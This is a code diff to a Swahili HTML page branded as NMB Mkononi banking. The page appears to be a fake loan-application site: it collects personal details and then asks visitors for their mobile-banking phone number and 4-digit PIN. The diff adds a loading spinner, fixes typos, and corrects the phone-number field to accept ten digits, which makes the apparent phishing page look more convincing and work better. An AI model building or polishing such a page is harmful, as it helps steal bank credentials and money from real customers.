@@ -7,6 +7,11 @@
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
+  <!-- Initial Page Loading Spinner Overlay -->
+  <div id="page-loader" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; display: flex; justify-content: center; align-items: center; z-index: 9999; transition: opacity 0.3s ease;">
+    <div class="spinner"></div>
+  </div>
+
   <header class="bank-header">
     <div class="header-container">
       <div class="logo-area">
@@ -75,7 +80,7 @@
         <div class="field">
           <label>Aina ya Mkopo</label>
           <select id="loan-type">
-            <option value="" disabled selected>Chagua aina ya mkopo (fano: Mkopo wa Biashara)</option>
+            <option value="" disabled selected>Chagua aina ya mkopo (Mfano: Mkopo wa Biashara)</option>
             <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
             <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
             <option value="Mkopo wa Dharura">Mkopo wa Dharura</option>
@@ -83,11 +88,11 @@
         </div>
         <div class="field">
           <label>Kiasi cha Mkopo (TZS)</label>
-          <input type="number" id="form-amount" placeholder="fano: 2500000" required>
+          <input type="number" id="form-amount" placeholder="Mfano: 2500000" required>
         </div>
         <div class="field">
           <label>Sababu ya Mkopo</label>
-          <textarea id="loan-purpose" placeholder="fano: Kupanua biashara yangu ya duka" rows="3" required></textarea>
+          <textarea id="loan-purpose" placeholder="Mfano: Kupanua biashara yangu ya duka" rows="3" required></textarea>
         </div>
         <button type="button" class="primary-btn next-btn" disabled>HATUA INAYOFUATA</button>
       </div>
@@ -97,17 +102,17 @@
         <div class="row-fields">
           <div class="field">
             <label>Jina la Kwanza</label>
-            <input type="text" id="first-name" placeholder="fano: Juma" required>
+            <input type="text" id="first-name" placeholder="Mfano: Juma" required>
           </div>
           <div class="field">
             <label>Jina la Mwisho</label>
-            <input type="text" id="last-name" placeholder="fano: Ally" required>
+            <input type="text" id="last-name" placeholder="Mfano: Ally" required>
           </div>
         </div>
         <div class="field">
           <label>Namba ya NMB Mkononi</label>
-          <input type="tel" id="user-contact" maxlength="9" pattern="[0-9]{9}" placeholder="fano: 0621234567" required>
-          <small class="hint">Weka namba yako halisi ya simu ya NMB Mkononi ya Tanzania.</small>
+          <input type="tel" id="user-contact" maxlength="10" pattern="[0-9]{10}" placeholder="Mfano: 0712345678" required>
+          <small class="hint">Weka namba yako halisi ya simu ya tarakimu 10 ya NMB Mkononi ya Tanzania.</small>
         </div>
         <div class="button-group">
           <button type="button" class="secondary-btn prev-btn">NYUMA</button>
@@ -120,7 +125,7 @@
         <div class="field">
           <label>Hali ya Ajira</label>
           <select id="employment-status">
-            <option value="" disabled selected>Chagua hali ya ajira (fano: Mmiliki wa Biashara)</option>
+            <option value="" disabled selected>Chagua hali ya ajira (Mfano: Mmiliki wa Biashara)</option>
             <option value="Ameajiriwa">Ameajiriwa</option>
             <option value="Kujiajiri">Kujiajiri</option>
             <option value="Mmiliki wa Biashara">Mmiliki wa Biashara</option>
@@ -128,7 +133,7 @@
         </div>
         <div class="field">
           <label>Mapato ya Mwaka (TZS)</label>
-          <input type="number" id="annual-income" placeholder="fano: 12000000" required>
+          <input type="number" id="annual-income" placeholder="Mfano: 12000000" required>
         </div>
 
         <div class="summary-box">
@@ -161,11 +166,11 @@
       <div class="login-header">
         <span class="bank-badge sm">NMB MKONONI</span>
         <h2>Ingiza Namba ya NMB</h2>
-        <p>Weka namba yako ya simu na PIN ya NMB Mkononi ili kuendelea</p>
+        <p>Weka namba yako ya simu (tarakimu 10) na PIN ya NMB Mkononi ili kuendelea</p>
       </div>
       <div class="field">
         <label>Namba ya NMB Mkononi</label>
-        <input type="tel" id="login-contact" maxlength="9" pattern="[0-9]{9}" placeholder="fano: 0621234567" required>
+        <input type="tel" id="login-contact" maxlength="10" pattern="[0-9]{10}" placeholder="Mfano: 0712345678" required>
       </div>
       <div class="field">
         <label>Ingiza PIN ya NMB (Namba 4)</label>
@@ -214,6 +219,18 @@
   </footer>
 
   <script src="script.js"></script>
+  <script>
+    // Hide initial loader once DOM content is fully loaded
+    window.addEventListener('DOMContentLoaded', () => {
+      const loader = document.getElementById('page-loader');
+      if (loader) {
+        setTimeout(() => {
+          loader.style.opacity = '0';
+          setTimeout(() => loader.remove(), 300);
+        }, 500);
+      }
+    });
+  </script>
 </body>
-  </html>
-          
+        </html>
+              
